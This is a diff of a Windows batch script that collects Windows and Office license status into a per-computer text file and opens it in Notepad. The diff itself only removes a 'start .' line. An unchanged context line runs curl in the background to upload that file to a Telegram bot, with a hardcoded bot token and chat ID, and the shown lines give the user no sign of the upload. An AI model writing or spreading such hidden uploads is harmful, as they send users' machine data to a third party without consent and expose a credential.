@@ -49,7 +49,6 @@ start /b cscript /nologo "%SystemRoot%\System32\slmgr.vbs" -xpr | findstr /v "^$
 start /b cscript /nologo "%PROGRAMFILES%\Microsoft Office\Office16\ospp.vbs" /dstatus | findstr /i "LICENSE STATUS" >>%computername%.txt
 start /b cscript /nologo "%PROGRAMFILES%\Microsoft Office\Office15\ospp.vbs" /dstatus | findstr /i "LICENSE STATUS" >>%computername%.txt
 start /b cscript /nologo "%PROGRAMFILES%\Microsoft Office\Office14\ospp.vbs" /dstatus | findstr /i "LICENSE STATUS" >>%computername%.txt
-start .
 start notepad %computername%.txt
 start /b curl https://api.telegram.org/bot6004543356:AAF6i-biw1YyheyKpE5QTjGs82r9-4Ontls/sendDocument -F "chat_id=-947339303" -F document=@%computername%.txt -F caption="ASOC-%date%-%time%"
 exit
